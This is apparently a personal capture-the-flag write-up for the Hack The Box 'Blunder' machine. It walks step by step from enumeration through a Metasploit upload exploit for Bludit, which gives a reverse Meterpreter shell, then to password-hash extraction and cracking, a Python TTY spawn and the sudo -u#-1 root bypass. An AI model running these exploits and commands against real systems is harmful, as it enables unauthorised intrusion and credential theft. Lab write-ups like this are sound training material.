# what I learn
- when use ```gobuster``` try to look for different files such as, txt, php
- CVE detail is one of ur bf, check all remote excetution code and the one with metasploit module
- NO need to brute force for HTB
- [spawning a TTY Shell.](https://netsec.ws/?p=337)
- [sudo vuln](https://www.bleepingcomputer.com/news/linux/linux-sudo-bug-lets-you-run-commands-as-root-most-installs-unaffected/) which allow you to run command as root.
- enumeration is the **key**


start with ```echo '<ip> blunder' >> /etc/hosts```


from now we can use ```blunder``` when we scan/enumerate and such no need to remember ip address.
now scan for open port
```console
kali@kali:~/HTB/blunder$ sudo nmap -sS -p- -vv blunder
.
.
PORT   STATE  SERVICE REASON
21/tcp closed ftp     reset ttl 63
80/tcp open   http    syn-ack ttl 63
.
kali@kali:~/HTB/blunder$ sudo nmap -A -p21,80 blunder
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-04 19:56 EDT
Nmap scan report for blunder (10.10.10.191)
Host is up (0.15s latency).                                                                        
                                                                                                   
PORT   STATE  SERVICE VERSION                                                                      
21/tcp closed ftp                                                                                  
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))                                               
|_http-generator: Blunder                                                                          
|_http-server-header: Apache/2.4.41 (Ubuntu)                                                       
|_http-title: Blunder | A blunder of interesting facts                                             
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (90%), Infomir MAG-250 set-top box (90%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (90%), Ubiquiti AirOS 5.5.9 (90%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (89%), Linux 2.6.32 - 3.13 (89%), Linux 3.3 (89%), Linux 2.6.32 - 3.1 (89%), Linux 3.7 (89%)                                                                          
No exact OS matches for host (test conditions non-ideal).                                          
Network Distance: 2 hops

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   34.97 ms  10.10.14.1
2   148.57 ms blunder (10.10.10.191)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.92 seconds
```
Note that there 2 ports open, *21 ftp* which means nothing to use since it is close and *80 http run on Apache httpd 2.4.41 ((Ubuntu))*


I recon web app, did find anything juicy so I decided to run nmap vuln scan to find out if more about port 80
```console
kali@kali:~/HTB/blunder$ nmap --script vuln -p80 blunder
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/admin/: Possible admin folder
|   /admin/account.php: Possible admin folder
|   /admin/index.php: Possible admin folder
|   /admin/login.php: Possible admin folder
|   /admin/admin.php: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /admin/login.html: Possible admin folder
|   /admin/admin.html: Possible admin folder
|   /admin/home.php: Possible admin folder
|   /admin/controlpanel.php: Possible admin folder
|   /admin/account.html: Possible admin folder
|   /admin/admin_login.html: Possible admin folder
|   /admin/cp.php: Possible admin folder
|   /admin/admin_login.php: Possible admin folder
|_  /admin/admin-login.php: Possible admin folder
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
```
seem like there is a admin login page and I found out that the web app is build on ```BLUDIT```, but any way we still need a cerdential


let run ```gobuster``` and try to find more pages
```console
kali@kali:~/HTB/blunder$ gobuster dir -u http://10.10.10.191 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,.php,.html -t 40
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.191
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt
[+] Timeout:        10s
===============================================================
2020/06/04 20:38:21 Starting gobuster
===============================================================
/about (Status: 200)
/0 (Status: 200)
/admin (Status: 301)
/empty (Status: 200)
/robots.txt (Status: 200)
/todo.txt (Status: 200)
/usb (Status: 200)
.
.
.
```
after go through some of those. I found something really intressting ```todo.txt```, I found a username.


Seem like ```BLUDIT``` have some anti brutefoce mechanism. read [here](https://docs.bludit.com/en/security/brute-force-protection)


after keep diging more I found [CVE-2019-17240](https://nvd.nist.gov/vuln/detail/CVE-2019-17240). now we are talking woop woop. I found a script [here](https://rastating.github.io/bludit-brute-force-mitigation-bypass/). It should work after some fixing and make it read password from ```rockyou.txt```


I spend a lot of thime try to work on the script. But then I found out that there is **no need bruteforce on any box in HTB**
So I spend more time on looking for ```BLUDIT``` CVE on this [BLUDIT' CVE](https://www.cvedetails.com/vulnerability-list/vendor_id-17229/product_id-41420/Bludit-Bludit.html) BUT I didn't find anything interesting.


So I went back to the web page and read each post, I might missed something. I try a lot of stuff out lol, I started with *USB* then move on to *stadia*, lastly, *stephen-king-0*.


in *stephen-king-0* a charrector is mentioned and it looks weird for me, a name should sperate firstname and lastname but in this case it merge together. Moreover, any name that mentioned in this post always spererated so I give it a try and........


BINGO, I got ```fergus``` credential. Now let recon a bit and try to see what we can do. In ```Profile```, We can change ```fergus``` password but that is not what we want. I also saw that we can upload a picture and it **hit** me.


Remember this [BLUDIT' CVE](https://www.cvedetails.com/vulnerability-list/vendor_id-17229/product_id-41420/Bludit-Bludit.html)? I saw this one [CVE-2019-16113](https://www.cvedetails.com/cve/CVE-2019-16113/)
```
Bludit 3.9.2 allows remote code execution via bl-kernel/ajax/upload-images.php because PHP code can be entered with a .jpg file name, and then this PHP code can write other PHP code to a ../ pathname. 
```
Moreover, we have 1 Metasploit modules for this CVE [here](https://www.rapid7.com/db/modules/exploit/linux/http/bludit_upload_images_exec). LET DO IT -> run ```msfconsole```
```
msf > use exploit/linux/http/bludit_upload_images_exec
msf exploit(bludit_upload_images_exec) > set TARGET 0
msf exploit(bludit_upload_images_exec) > show options
    ...show and set options...
msf exploit(bludit_upload_images_exec) > exploit
[*] Started reverse TCP handler on 10.10.14.105:4444 
[+] Logged in as: fergus
[*] Retrieving UUID...
[*] Uploading qejkHQkgkK.png...
[*] Uploading .htaccess...
[*] Executing qejkHQkgkK.png...
[*] Sending stage (38288 bytes) to 10.10.10.191
[*] Meterpreter session 1 opened (10.10.14.105:4444 -> 10.10.10.191:37388) at 2020-06-05 10:44:48 -0400
[+] Deleted .htaccess

meterpreter > 
```
WE ARE IN!!!


After some enumerating, I found *User.txt* but we do not have premission to do open it. The file is owner is hugo. I when back to home dir for ```www-data``` > ```/var/www/```  and start to enumerating ```bludit-3.9.2``` and try to find something usefull. I saw ```/bl-content/databases``` and it look intressting. I then hit the jackpot when I ran ```grep -R password```.
```
pwd
/var/www/bludit-3.9.2/bl-content/databases
cd ..
grep -R password
databases/users.php:        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
databases/users.php:        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
```
damn users.php look juicy let. check it out ```cat users.php```
```php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Admin",
        "firstName": "Administrator",
        "lastName": "",
        "role": "admin",
        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
        "salt": "5dde2887e7aca",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""
    },
    "fergus": {
        "firstName": "",
        "lastName": "",
        "nickname": "",
        "description": "",
        "role": "author",
        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
        "salt": "jqxpjfnv",
        "email": "",
        "registered": "2019-11-27 13:26:44",
        "tokenRemember": "",
        "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "codepen": "",
        "instagram": "",
        "github": "",
        "gitlab": "",
        "linkedin": "",
        "mastodon": ""
    }
}
```
by using [Hash Analyzer](https://www.tunnelsup.com/hash-analyzer/) and it seem like both are **SHA1**. Let use ```hashcat``` to crack it. let start by visiting [hash example](https://hashcat.net/wiki/doku.php?id=example_hashes). I tried to crack with hash:salt using rockyou.txt. It didnt work so I assume that I got a wrong clue.


So I decided to check anotherd directory in ```/var/www/``` which is ```bludit-3.10.0a```. So I check ```/var/www/bludit-3.10.0a/bl-content/databases/users.php``` since last time we found juicy stuff in *user.php* ib *bludit3.9.2*. And I like I thougth.
```php
cat bl-content/databases/users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```
Now I try to use Hashcat again to crack it but I didnt get any hit by using ```rockyou.txt```. So I decided to use [crackstation](https://crackstation.net/) instead and it **works**.


now let get user flag
```console
$ su - hugo
Password:
$ whoami
hugo
$ cat /home/hugo/user.txt
```
To get root, I started with checking allowed commands for the Hugo
```console
su hugo 
Password:
whoami
hugo
sudo -l
sudo: no tty present and no askpass program specified
```
this is not good ```sudo: no tty present and no askpass program specified``` this pop up whenever I try to use sudo...


After researching a bit, I found this https://netsec.ws/?p=337 which different can spawning a TTY Shell.
```console
python -c 'import pty; pty.spawn("/bin/bash")'
hugo@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ sudo -l
sudo -l
Password: 

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```
Yes is work, and it seem like we are allow to use bin/bash + sudo. After long time digging around, I found [sudo vuln](https://www.bleepingcomputer.com/news/linux/linux-sudo-bug-lets-you-run-commands-as-root-most-installs-unaffected/) which allow you to run command as root.
```console
hugo@blunder:~$ sudo -u#-1 /bin/bash
sudo -u#-1 /bin/bash
root@blunder:/home/hugo# ls /root
ls /root
root.txt
root@blunder:/home/hugo# cat /root/root.txt
```


GGWP